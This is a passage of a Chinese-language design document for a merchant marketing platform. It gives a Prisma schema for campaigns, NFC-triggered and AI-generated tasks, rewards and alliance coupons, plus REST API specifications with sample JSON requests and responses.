  successCount       Int       @default(0) @map("success_count")
  reviewRemark       String?   @map("review_remark") @db.VarChar(500)
  reviewedAt         DateTime? @map("reviewed_at")
  reviewedBy         String?   @map("reviewed_by")
  createdAt          DateTime  @default(now()) @map("created_at")
  updatedAt          DateTime  @updatedAt @map("updated_at")

  // 关系
  merchant         Merchant          @relation(fields: [merchantId], references: [id], onDelete: Cascade)
  reviewedByStaff  Staff?            @relation(fields: [reviewedBy], references: [id], onDelete: SetNull)
  tasks            CampaignTask[]
  rewards          Reward[]
  taskSubmissions  TaskSubmission[]
  rewardClaims     RewardClaim[]
  allianceCoupons  AllianceCoupon[]

  @@index([merchantId])
  @@index([status])
  @@index([startTime, endTime])
  @@map("campaigns")
}

model CampaignTask {
  id           String   @id @default(uuid())
  campaignId   String   @map("campaign_id")
  storeId      String?  @map("store_id")
  taskNo       Int      @map("task_no") // 1,2,3代表三关
  name         String   @db.VarChar(200)
  description  String?  @db.Text
  taskType     Int      @map("task_type") // 1-NFC触发, 2-拍照打卡, 3-AI生成, 4-加企微, 5-填写信息
  ruleConfig   Json     @map("rule_config")
  proofConfig  Json?    @map("proof_config")
  aiPrompt     String?  @map("ai_prompt") @db.Text
  aiModel      String?  @map("ai_model") @db.VarChar(100)
  rewardConfig Json?    @map("reward_config")
  status       Int      @default(1) // 0-禁用, 1-启用
  sortOrder    Int      @default(0) @map("sort_order")
  createdAt    DateTime @default(now()) @map("created_at")
  updatedAt    DateTime @updatedAt @map("updated_at")

  // 关系
  campaign        Campaign         @relation(fields: [campaignId], references: [id], onDelete: Cascade)
  store           Store?           @relation(fields: [storeId], references: [id], onDelete: Cascade)
  submissions     TaskSubmission[]
  aiGenerations  AIGeneration[]

  @@index([campaignId])
  @@index([storeId])
  @@index([taskNo])
  @@index([status])
  @@map("campaign_tasks")
}

model TaskSubmission {
  id             String    @id @default(uuid())
  userId         String    @map("user_id")
  campaignId     String    @map("campaign_id")
  taskId         String    @map("task_id")
  storeId        String?   @map("store_id")
  submissionNo   String    @unique @map("submission_no") @db.VarChar(50)
  content        Json?     // AI生成内容、照片URL等
  proofImages    Json?     @map("proof_images")
  proofText      String?   @map("proof_text") @db.Text
  status         Int       @default(1) // 0-草稿, 1-待审核, 2-已通过, 3-已拒绝, 4-已撤回
  rejectReason   String?   @map("reject_reason") @db.VarChar(500)
  reviewedAt     DateTime? @map("reviewed_at")
  reviewedBy     String?   @map("reviewed_by")
  reviewRemark   String?   @map("review_remark") @db.VarChar(500)
  nfcTag         String?   @map("nfc_tag") @db.VarChar(200)
  deviceInfo     Json?     @map("device_info")
  location       Json?
  ipAddress      String?   @map("ip_address") @db.VarChar(50)
  completedAt    DateTime? @map("completed_at")
  createdAt      DateTime  @default(now()) @map("created_at")
  updatedAt      DateTime  @updatedAt @map("updated_at")

  // 关系
  user         User        @relation(fields: [userId], references: [id], onDelete: Cascade)
  campaign     Campaign    @relation(fields: [campaignId], references: [id], onDelete: Cascade)
  task         CampaignTask @relation(fields: [taskId], references: [id], onDelete: Cascade)
  store        Store?      @relation(fields: [storeId], references: [id], onDelete: SetNull)
  reviewedBy   Staff?      @relation("ReviewedBy", fields: [reviewedBy], references: [id], onDelete: SetNull)
  aiGenerations AIGeneration[]

  @@index([userId])
  @@index([campaignId])
  @@index([taskId])
  @@index([storeId])
  @@index([status])
  @@index([submissionNo])
  @@index([createdAt])
  @@map("task_submissions")
}

// ==================== 奖励相关 ====================

model Reward {
  id              String   @id @default(uuid())
  campaignId      String   @map("campaign_id")
  name            String   @db.VarChar(200)
  rewardType      Int      @map("reward_type") // 1-优惠券, 2-红包, 3-积分, 4-实物, 5-兑换码
  value           Decimal? @db.Decimal(10, 2)
  totalQuantity   Int?     @map("total_quantity")
  claimedCount    Int      @default(0) @map("claimed_count")
  usedCount       Int      @default(0) @map("used_count")
  limitPerUser    Int      @default(1) @map("limit_per_user")
  minTaskCompleted Int     @default(3) @map("min_task_completed")
  validDays       Int?     @map("valid_days")
  validStartAt    DateTime? @map("valid_start_at")
  validEndAt      DateTime? @map("valid_end_at")
  rules           Json?    // 使用规则
  couponTemplateId String? @map("coupon_template_id") @db.VarChar(100)
  status          Int      @default(1) // 0-禁用, 1-启用
  createdAt       DateTime @default(now()) @map("created_at")
  updatedAt       DateTime @updatedAt @map("updated_at")

  // 关系
  campaign Campaign      @relation(fields: [campaignId], references: [id], onDelete: Cascade)
  claims   RewardClaim[]

  @@index([campaignId])
  @@index([rewardType])
  @@index([status])
  @@map("rewards")
}

model RewardClaim {
  id              String   @id @default(uuid())
  userId          String   @map("user_id")
  rewardId        String   @map("reward_id")
  campaignId      String   @map("campaign_id")
  claimNo         String   @unique @map("claim_no") @db.VarChar(50)
  rewardType      Int      @map("reward_type")
  rewardValue     Decimal? @map("reward_value") @db.Decimal(10, 2)
  couponCode      String?  @map("coupon_code") @db.VarChar(100)
  qrCode          String?  @map("qr_code") @db.VarChar(500)
  status          Int      @default(1) // 1-已领取, 2-已使用, 3-已过期, 4-已失效
  claimedAt       DateTime @default(now()) @map("claimed_at")
  usedAt          DateTime? @map("used_at")
  expireAt        DateTime? @map("expire_at")
  usedStoreId     String?  @map("used_store_id")
  usedTransactionNo String? @map("used_transaction_no") @db.VarChar(100)
  createdAt       DateTime @default(now()) @map("created_at")
  updatedAt       DateTime @updatedAt @map("updated_at")

  // 关系
  user       User    @relation(fields: [userId], references: [id], onDelete: Cascade)
  reward     Reward  @relation(fields: [rewardId], references: [id], onDelete: Cascade)
  campaign   Campaign @relation(fields: [campaignId], references: [id], onDelete: Cascade)
  usedStore  Store?   @relation(fields: [usedStoreId], references: [id], onDelete: SetNull)

  @@index([userId])
  @@index([rewardId])
  @@index([campaignId])
  @@index([claimNo])
  @@index([status])
  @@index([couponCode])
  @@map("reward_claims")
}

// ==================== NFC相关 ====================

model NFCCard {
  id              String   @id @default(uuid())
  storeId         String   @map("store_id")
  cardNo          String   @map("card_no") @db.VarChar(100)
  cardUid         String?  @unique @map("card_uid") @db.VarChar(100)
  cardType        Int      @default(1) @map("card_type") // 1-桌贴, 2-立牌, 3-手牌
  locationDesc    String?  @map("location_desc") @db.VarChar(200)
  campaignId      String?  @map("campaign_id")
  status          Int      @default(1) // 0-禁用, 1-启用
  tapCount        Int      @default(0) @map("tap_count")
  uniqueTapCount  Int      @default(0) @map("unique_tap_count")
  lastTapAt       DateTime? @map("last_tap_at")
  batchNo         String?  @map("batch_no") @db.VarChar(50)
  manufacturedAt  DateTime? @map("manufactured_at") @db.Date
  activatedAt     DateTime? @map("activated_at")
  createdAt       DateTime @default(now()) @map("created_at")
  updatedAt       DateTime @updatedAt @map("updated_at")

  // 关系
  store    Store       @relation(fields: [storeId], references: [id], onDelete: Cascade)
  campaign Campaign?   @relation(fields: [campaignId], references: [id], onDelete: SetNull)

  @@index([storeId])
  @@index([cardNo])
  @@index([cardUid])
  @@index([campaignId])
  @@index([status])
  @@map("nfc_cards")
}

// ==================== 事件埋点 ====================

model Event {
  id           String   @id @default(uuid())
  eventType    String   @map("event_type") @db.VarChar(50)
  userId       String?  @map("user_id")
  sessionId    String?  @map("session_id") @db.VarChar(100)
  deviceInfo   Json?    @map("device_info")
  browser      String?  @db.VarChar(100)
  os           String?  @db.VarChar(50)
  screen       String?  @db.VarChar(50)
  network      String?  @db.VarChar(20)
  ipAddress    String?  @map("ip_address") @db.VarChar(50)
  country      String?  @db.VarChar(50)
  province      String?  @db.VarChar(50)
  city          String?  @db.VarChar(50)
  latitude     Decimal? @db.Decimal(10, 7)
  longitude    Decimal? @db.Decimal(10, 7)
  url          String?  @db.VarChar(500)
  referrer     String?  @db.VarChar(500)
  eventData    Json     @map("event_data")
  clientTime   DateTime? @map("client_time")
  serverTime   DateTime @default(now()) @map("server_time")

  // 关系
  user User? @relation(fields: [userId], references: [id], onDelete: SetNull)

  @@index([eventType])
  @@index([userId])
  @@index([sessionId])
  @@index([serverTime])
  @@map("events")
}

// ==================== AI生成 ====================

model AIGeneration {
  id               String   @id @default(uuid())
  userId           String   @map("user_id")
  taskId           String   @map("task_id")
  submissionId     String?  @map("submission_id")
  model            String   @db.VarChar(100)
  prompt           String   @db.Text
  content          String?  @db.Text
  imageUrl         String?  @map("image_url") @db.VarChar(500)
  tokensUsed       Int?     @map("tokens_used")
  generationType   Int      @map("generation_type") // 1-文案, 2-图片, 3-混合
  status           Int      @default(1) // 0-失败, 1-成功
  errorMessage     String?  @map("error_message") @db.Text
  cost             Decimal? @db.Decimal(8, 4)
  processingTime   Int?     @map("processing_time")
  createdAt        DateTime @default(now()) @map("created_at")

  // 关系
  user       User           @relation(fields: [userId], references: [id], onDelete: Cascade)
  task       CampaignTask   @relation(fields: [taskId], references: [id], onDelete: Cascade)
  submission TaskSubmission? @relation(fields: [submissionId], references: [id], onDelete: SetNull)

  @@index([userId])
  @@index([taskId])
  @@index([submissionId])
  @@index([model])
  @@index([createdAt])
  @@map("ai_generations")
}

// ==================== 异业合作 ====================

model AlliancePartner {
  id               String   @id @default(uuid())
  merchantId       String   @map("merchant_id")
  partnerName      String   @map("partner_name") @db.VarChar(200)
  partnerLogo      String?  @map("partner_logo") @db.VarChar(500)
  partnerType      Int      @map("partner_type") // 1-优惠券合作, 2-流量互换, 3-联合活动
  contactName      String?  @map("contact_name") @db.VarChar(100)
  contactPhone     String?  @map("contact_phone") @db.VarChar(20)
  contactWechat    String?  @map("contact_wechat") @db.VarChar(100)
  province         String?  @db.VarChar(50)
  city             String?  @db.VarChar(50)
  industry         String?  @db.VarChar(50)
  description      String?  @db.Text
  contractStart    DateTime? @map("contract_start") @db.Date
  contractEnd      DateTime? @map("contract_end") @db.Date
  commissionRate   Decimal? @map("commission_rate") @db.Decimal(5, 2)
  status           Int      @default(1) // 0-已终止, 1-合作中, 2-待审核
  createdAt        DateTime @default(now()) @map("created_at")
  updatedAt        DateTime @updatedAt @map("updated_at")

  // 关系
  merchant Merchant         @relation(fields: [merchantId], references: [id], onDelete: Cascade)
  coupons  AllianceCoupon[]

  @@index([merchantId])
  @@index([status])
  @@index([partnerType])
  @@map("alliance_partners")
}

model AllianceCoupon {
  id                String   @id @default(uuid())
  partnerId         String   @map("partner_id")
  campaignId        String?  @map("campaign_id")
  name              String   @db.VarChar(200)
  description       String?  @db.Text
  couponType        Int      @map("coupon_type") // 1-满减券, 2-折扣券, 3-兑换券, 4-体验券
  faceValue         Decimal? @map("face_value") @db.Decimal(10, 2)
  minConsume        Decimal? @map("min_consume") @db.Decimal(10, 2)
  discountRate      Decimal? @map("discount_rate") @db.Decimal(5, 2)
  totalQuantity     Int?     @map("total_quantity")
  claimedCount      Int      @default(0) @map("claimed_count")
  usedCount         Int      @default(0) @map("used_count")
  perUserLimit      Int      @default(1) @map("per_user_limit")
  validDays         Int?     @map("valid_days")
  validStartAt      DateTime? @map("valid_start_at")
  validEndAt        DateTime? @map("valid_end_at")
  useRules          String?  @map("use_rules") @db.Text
  imageUrl          String?  @map("image_url") @db.VarChar(500)
  codePrefix        String?  @map("code_prefix") @db.VarChar(20)
  thirdPartyCode    String?  @map("third_party_code") @db.VarChar(100)
  status            Int      @default(1) // 0-禁用, 1-待投放, 2-投放中, 3-已下架
  createdAt         DateTime @default(now()) @map("created_at")
  updatedAt         DateTime @updatedAt @map("updated_at")

  // 关系
  partner   AlliancePartner @relation(fields: [partnerId], references: [id], onDelete: Cascade)
  campaign  Campaign?       @relation(fields: [campaignId], references: [id], onDelete: SetNull)
  claims    CouponClaim[]

  @@index([partnerId])
  @@index([campaignId])
  @@index([status])
  @@index([validEndAt])
  @@map("alliance_coupons")
}

model CouponClaim {
  id                 String   @id @default(uuid())
  userId             String   @map("user_id")
  couponId           String   @map("coupon_id")
  campaignId         String?  @map("campaign_id")
  claimNo            String   @unique @map("claim_no") @db.VarChar(50)
  couponCode         String?  @map("coupon_code") @db.VarChar(100)
  qrCode             String?  @map("qr_code") @db.VarChar(500)
  status             Int      @default(1) // 1-已领取, 2-已使用, 3-已过期, 4-已失效
  source             Int      @default(1) // 1-活动任务, 2-分享, 3-主动领取
  claimedAt          DateTime @default(now()) @map("claimed_at")
  usedAt             DateTime? @map("used_at")
  expireAt           DateTime? @map("expire_at")
  usedStoreName      String?  @map("used_store_name") @db.VarChar(200)
  usedTransactionNo  String?  @map("used_transaction_no") @db.VarChar(100)
  createdAt          DateTime @default(now()) @map("created_at")
  updatedAt          DateTime @updatedAt @map("updated_at")

  // 关系
  user     User           @relation(fields: [userId], references: [id], onDelete: Cascade)
  coupon   AllianceCoupon @relation(fields: [couponId], references: [id], onDelete: Cascade)
  campaign Campaign?      @relation(fields: [campaignId], references: [id], onDelete: SetNull)

  @@index([userId])
  @@index([couponId])
  @@index([campaignId])
  @@index([claimNo])
  @@index([status])
  @@index([couponCode])
  @@map("coupon_claims")
}

// ==================== 审核日志 ====================

model AuditLog {
  id            String   @id @default(uuid())
  auditType     String   @map("audit_type") @db.VarChar(50) // campaign_review, submission_review, merchant_review
  targetId      String   @map("target_id")
  targetType    String   @map("target_type") @db.VarChar(50)
  action        Int      // 1-提交, 2-通过, 3-拒绝, 4-撤回, 5-修改
  operatorId    String?  @map("operator_id")
  operatorName  String?  @map("operator_name") @db.VarChar(100)
  operatorRole  Int?     @map("operator_role")
  beforeStatus  Int?     @map("before_status")
  afterStatus   Int?     @map("after_status")
  remark        String?  @db.Text
  attachments   Json?    // 附件
  ipAddress     String?  @map("ip_address") @db.VarChar(50)
  userAgent     String?  @map("user_agent") @db.VarChar(500)
  createdAt     DateTime @default(now()) @map("created_at")

  // 关系
  operator Staff? @relation(fields: [operatorId], references: [id], onDelete: SetNull)

  @@index([auditType])
  @@index([targetId])
  @@index([targetType])
  @@index([operatorId])
  @@index([createdAt])
  @@map("audit_logs")
}
```

---

## 3. API路由设计

### 3.1 认证相关 /api/auth/*

#### POST /api/auth/login
用户登录/注册

**Request:**
```json
{
  "phone": "13800138000",
  "code": "123456",
  "openid": "wechat_openid_xxx",
  "inviteCode": "ABC123"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "expiresIn": 7200,
    "user": {
      "id": "uuid",
      "phone": "13800138000",
      "nickname": "用户昵称",
      "avatarUrl": "https://xxx/avatar.jpg",
      "status": 1
    }
  }
}
```

#### POST /api/auth/send-code
发送短信验证码

**Request:**
```json
{
  "phone": "13800138000",
  "type": "login"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "expiresIn": 300
  }
}
```

#### POST /api/auth/refresh-token
刷新Token

**Request:**
```json
{
  "refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "expiresIn": 7200
  }
}
```

#### POST /api/auth/logout
登出

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### GET /api/auth/profile
获取当前用户信息

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "phone": "13800138000",
    "nickname": "用户昵称",
    "avatarUrl": "https://xxx/avatar.jpg",
    "openid": "wechat_openid_xxx",
    "status": 1,
    "memberSince": "2024-01-15T10:30:00Z"
  }
}
```

#### PUT /api/auth/profile
更新用户信息

**Headers:** Authorization: Bearer {token}

**Request:**
```json
{
  "nickname": "新昵称",
  "avatarUrl": "https://xxx/new_avatar.jpg",
  "realName": "张三",
  "idCard": "110101199001011234"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "nickname": "新昵称",
    "avatarUrl": "https://xxx/new_avatar.jpg",
    "realName": "张三",
    "idCard": "110101199001011234"
  }
}
```

---

### 3.2 商家相关 /api/merchants/*

#### GET /api/merchants
商家列表

**Headers:** Authorization: Bearer {token} (平台方角色)

**Query Parameters:**
- page (int, default: 1)
- pageSize (int, default: 20, max: 100)
- status (int, optional): 0-禁用, 1-正常, 2-待审核
- keyword (string, optional): 搜索关键词
- province (string, optional)
- city (string, optional)
- category (string, optional)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "name": "某某商家",
        "logoUrl": "https://xxx/logo.jpg",
        "contactPhone": "400-xxx",
        "province": "北京市",
        "city": "北京市",
        "district": "朝阳区",
        "address": "xxx路xxx号",
        "category": "餐饮",
        "status": 1,
        "storeCount": 5,
        "campaignCount": 3,
        "createdAt": "2024-01-15T10:30:00Z"
      }
    ],
    "pagination": {
      "page": 1,
      "pageSize": 20,
      "total": 100,
      "totalPages": 5
    }
  }
}
```

#### GET /api/merchants/:id
商家详情

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "name": "某某商家",
    "logoUrl": "https://xxx/logo.jpg",
    "contactName": "李经理",
    "contactPhone": "13800138000",
    "contactEmail": "contact@merchant.com",
    "businessLicense": "https://xxx/license.jpg",
    "province": "北京市",
    "city": "北京市",
    "district": "朝阳区",
    "address": "xxx路xxx号",
    "longitude": 116.4074,
    "latitude": 39.9042,
    "category": "餐饮",
    "description": "商家描述...",
    "status": 1,
    "stores": [
      {
        "id": "uuid",
        "name": "某某店",
        "address": "xxx路xxx号"
      }
    ],
    "stats": {
      "totalCampaigns": 10,
      "activeCampaigns": 3,
      "totalParticipations": 5000,
      "totalRewards": 10000
    },
    "createdAt": "2024-01-15T10:30:00Z"
  }
}
```

#### POST /api/merchants
创建商家

**Headers:** Authorization: Bearer {token} (平台方角色)

**Request:**
```json
{
  "name": "某某商家",
  "logoUrl": "https://xxx/logo.jpg",
  "contactName": "李经理",
  "contactPhone": "13800138000",
  "contactEmail": "contact@merchant.com",
  "province": "北京市",
  "city": "北京市",
  "district": "朝阳区",
  "address": "xxx路xxx号",
  "longitude": 116.4074,
  "latitude": 39.9042,
  "category": "餐饮",
  "description": "商家描述..."
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/merchants/:id
更新商家信息

**Headers:** Authorization: Bearer {token} (平台方或商家管理员)

**Request:**
```json
{
  "name": "某某商家(改名)",
  "contactPhone": "13900139000",
  "description": "更新后的描述..."
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### PUT /api/merchants/:id/status
更新商家状态

**Headers:** Authorization: Bearer {token} (平台方角色)

**Request:**
```json
{
  "status": 1,
  "reason": "审核通过"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### GET /api/merchants/:id/staff
商家员工列表

**Headers:** Authorization: Bearer {token} (商家管理员或平台方)

**Query Parameters:**
- page (int, default: 1)
- pageSize (int, default: 20)
- storeId (uuid, optional)
- role (int, optional): 1-管理员, 2-店长, 3-店员

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "userId": "uuid",
        "name": "员工姓名",
        "phone": "13800138000",
        "role": 2,
        "roleName": "店长",
        "storeId": "uuid",
        "storeName": "门店名称",
        "status": 1,
        "hiredAt": "2024-01-01"
      }
    ],
    "pagination": {...}
  }
}
```

#### POST /api/merchants/:id/staff
添加员工

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "phone": "13800138000",
  "name": "员工姓名",
  "role": 3,
  "storeId": "uuid",
  "department": "销售部",
  "position": "店员"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "userId": "uuid"
  }
}
```

---

### 3.3 门店相关 /api/stores/*

#### GET /api/stores
门店列表

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- merchantId (uuid, optional)
- page (int, default: 1)
- pageSize (int, default: 20)
- keyword (string, optional)
- status (int, optional)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "merchantId": "uuid",
        "merchantName": "商家名称",
        "name": "门店名称",
        "storeCode": "S001",
        "contactPhone": "400-xxx",
        "province": "北京市",
        "city": "北京市",
        "district": "朝阳区",
        "address": "xxx路xxx号",
        "longitude": 116.4074,
        "latitude": 39.9042,
        "businessHours": "09:00-22:00",
        "status": 1,
        "nfcCount": 10,
        "campaignCount": 2
      }
    ],
    "pagination": {...}
  }
}
```

#### GET /api/stores/:id
门店详情

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "merchantId": "uuid",
    "merchantName": "商家名称",
    "name": "门店名称",
    "storeCode": "S001",
    "contactPhone": "400-xxx",
    "province": "北京市",
    "city": "北京市",
    "district": "朝阳区",
    "address": "xxx路xxx号",
    "longitude": 116.4074,
    "latitude": 39.9042,
    "businessHours": "09:00-22:00",
    "status": 1,
    "nfcCards": [
      {
        "id": "uuid",
        "cardNo": "NFC001",
        "cardType": 1,
        "locationDesc": "门口桌贴",
        "status": 1,
        "tapCount": 100
      }
    ],
    "stats": {
      "todayTapCount": 50,
      "todayParticipation": 20,
      "totalTapCount": 1000,
      "totalParticipation": 500
    }
  }
}
```

#### POST /api/stores
创建门店

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "merchantId": "uuid",
  "name": "门店名称",
  "storeCode": "S001",
  "contactPhone": "400-xxx",
  "province": "北京市",
  "city": "北京市",
  "district": "朝阳区",
  "address": "xxx路xxx号",
  "longitude": 116.4074,
  "latitude": 39.9042,
  "businessHours": "09:00-22:00"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/stores/:id
更新门店

**Headers:** Authorization: Bearer {token} (商家管理员或店长)

**Request:**
```json
{
  "name": "新门店名称",
  "contactPhone": "400-yyy",
  "businessHours": "10:00-21:00"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### DELETE /api/stores/:id
删除门店

**Headers:** Authorization: Bearer {token} (商家管理员)

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

---

### 3.4 活动相关 /api/campaigns/*

#### GET /api/campaigns
活动列表

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- merchantId (uuid, optional)
- status (int, optional): 0-草稿, 1-待审核, 2-进行中, 3-已结束, 4-已下线
- page (int, default: 1)
- pageSize (int, default: 20)
- startTimeFrom (ISO date, optional)
- startTimeTo (ISO date, optional)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "merchantId": "uuid",
        "merchantName": "商家名称",
        "name": "活动名称",
        "coverImage": "https://xxx/cover.jpg",
        "startTime": "2024-06-01T00:00:00Z",
        "endTime": "2024-06-30T23:59:59Z",
        "status": 2,
        "statusName": "进行中",
        "targetType": 1,
        "targetTypeName": "拉新",
        "budget": 10000.00,
        "actualCost": 5000.00,
        "participationCount": 1000,
        "successCount": 800,
        "taskCount": 3,
        "rewardCount": 2
      }
    ],
    "pagination": {...}
  }
}
```

#### GET /api/campaigns/:id
活动详情

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "merchantId": "uuid",
    "merchantName": "商家名称",
    "name": "活动名称",
    "description": "活动描述...",
    "coverImage": "https://xxx/cover.jpg",
    "rules": {
      "eligibleUsers": "所有用户",
      "maxParticipations": 1,
      "winRate": "100%"
    },
    "startTime": "2024-06-01T00:00:00Z",
    "endTime": "2024-06-30T23:59:59Z",
    "status": 2,
    "targetType": 1,
    "budget": 10000.00,
    "actualCost": 5000.00,
    "participationCount": 1000,
    "successCount": 800,
    "tasks": [
      {
        "id": "uuid",
        "taskNo": 1,
        "name": "第一关: 碰NFC+加企微",
        "taskType": 1,
        "taskTypeName": "NFC触发",
        "status": 1,
        "submissionCount": 900,
        "passCount": 850
      },
      {
        "id": "uuid",
        "taskNo": 2,
        "name": "第二关: 拍照打卡",
        "taskType": 2,
        "taskTypeName": "拍照打卡",
        "status": 1,
        "submissionCount": 800,
        "passCount": 750
      },
      {
        "id": "uuid",
        "taskNo": 3,
        "name": "第三关: AI种草",
        "taskType": 3,
        "taskTypeName": "AI生成",
        "status": 1,
        "submissionCount": 750,
        "passCount": 700
      }
    ],
    "rewards": [
      {
        "id": "uuid",
        "name": "优惠券奖励",
        "rewardType": 1,
        "rewardTypeName": "优惠券",
        "value": 10.00,
        "totalQuantity": 1000,
        "claimedCount": 800,
        "usedCount": 500
      }
    ],
    "reviewInfo": {
      "status": 2,
      "reviewedAt": "2024-05-30T10:00:00Z",
      "reviewedBy": "审核员",
      "remark": "审核通过"
    },
    "createdAt": "2024-05-25T10:00:00Z"
  }
}
```

#### GET /api/campaigns/:id/public
活动详情(公开接口,无需认证)

**Query Parameters:**
- storeId (uuid, optional)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid",
    "name": "活动名称",
    "description": "活动描述...",
    "coverImage": "https://xxx/cover.jpg",
    "startTime": "2024-06-01T00:00:00Z",
    "endTime": "2024-06-30T23:59:59Z",
    "status": 2,
    "tasks": [...],
    "rewards": [...]
  }
}
```

#### POST /api/campaigns
创建活动

**Headers:** Authorization: Bearer {token} (商家管理员/店长)

**Request:**
```json
{
  "merchantId": "uuid",
  "name": "活动名称",
  "description": "活动描述...",
  "coverImage": "https://xxx/cover.jpg",
  "rules": {
    "eligibleUsers": "所有用户",
    "maxParticipations": 1
  },
  "startTime": "2024-06-01T00:00:00Z",
  "endTime": "2024-06-30T23:59:59Z",
  "targetType": 1,
  "budget": 10000.00
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/campaigns/:id
更新活动

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "name": "更新后的活动名称",
  "description": "更新后的描述...",
  "endTime": "2024-07-31T23:59:59Z"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### POST /api/campaigns/:id/submit
提交活动审核

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "remark": "提交审核备注"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### PUT /api/campaigns/:id/review
审核活动

**Headers:** Authorization: Bearer {token} (平台方角色)

**Request:**
```json
{
  "status": 2,
  "remark": "审核通过"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### PUT /api/campaigns/:id/terminate
终止活动

**Headers:** Authorization: Bearer {token} (商家管理员或平台方)

**Request:**
```json
{
  "reason": "提前终止原因"
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

---

### 3.5 任务配置 /api/tasks/*

#### GET /api/campaigns/:campaignId/tasks
活动任务列表

**Headers:** Authorization: Bearer {token}

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": [
    {
      "id": "uuid",
      "campaignId": "uuid",
      "storeId": "uuid",
      "storeName": "限定门店(可为空)",
      "taskNo": 1,
      "name": "第一关: 碰NFC+加企微",
      "description": "任务描述...",
      "taskType": 1,
      "taskTypeName": "NFC触发",
      "ruleConfig": {
        "requireWechatAdd": true,
        "wechatQrCode": "https://xxx/qr.jpg"
      },
      "proofConfig": {
        "requireProof": false
      },
      "aiPrompt": null,
      "aiModel": null,
      "status": 1,
      "sortOrder": 1
    }
  ]
}
```

#### POST /api/campaigns/:campaignId/tasks
创建任务配置

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "storeId": "uuid",
  "taskNo": 1,
  "name": "第一关: 碰NFC+加企微",
  "description": "任务描述...",
  "taskType": 1,
  "ruleConfig": {
    "requireWechatAdd": true,
    "wechatQrCode": "https://xxx/qr.jpg",
    "minTapDuration": 0
  },
  "proofConfig": {
    "requireProof": false
  },
  "rewardConfig": {
    "enabled": true,
    "multiplier": 1.0
  },
  "status": 1,
  "sortOrder": 1
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "id": "uuid"
  }
}
```

#### PUT /api/tasks/:id
更新任务配置

**Headers:** Authorization: Bearer {token} (商家管理员)

**Request:**
```json
{
  "name": "更新后的任务名称",
  "ruleConfig": {...},
  "status": 1,
  "sortOrder": 2
}
```

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

#### DELETE /api/tasks/:id
删除任务配置

**Headers:** Authorization: Bearer {token} (商家管理员)

**Response:**
```json
{
  "code": 0,
  "message": "success"
}
```

---

### 3.6 任务提交 /api/submissions/*

#### GET /api/submissions
提交记录列表

**Headers:** Authorization: Bearer {token}

**Query Parameters:**
- campaignId (uuid, optional)
- taskId (uuid, optional)
- storeId (uuid, optional)
- status (int, optional): 0-草稿, 1-待审核, 2-已通过, 3-已拒绝, 4-已撤回
- page (int, default: 1)
- pageSize (int, default: 20)
- startTime (ISO date, optional)
- endTime (ISO date, optional)

**Response:**
```json
{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": "uuid",
        "submissionNo": "SUB202406010001",
        "userId": "uuid",
        "userPhone": "138****8000",
        "userNickname": "用户昵称",
        "campaignId": "uuid",
        "campaignName": "活动名称",
        "taskId": "uuid",
        "taskName": "任务名称",
        "storeId": "uuid",
        "storeName": "门店名称",
        "status": 2,
        "statusName": "已通过",
        "proofImages": ["https://xxx/1.jpg"],
        "proofText": "点评内容...",
        "content": {
          "aiGeneratedText": "生成的文案..."
        },
        "reviewedAt": "2024-06-02T10:00:00Z",
        "reviewedByName": "审核员",
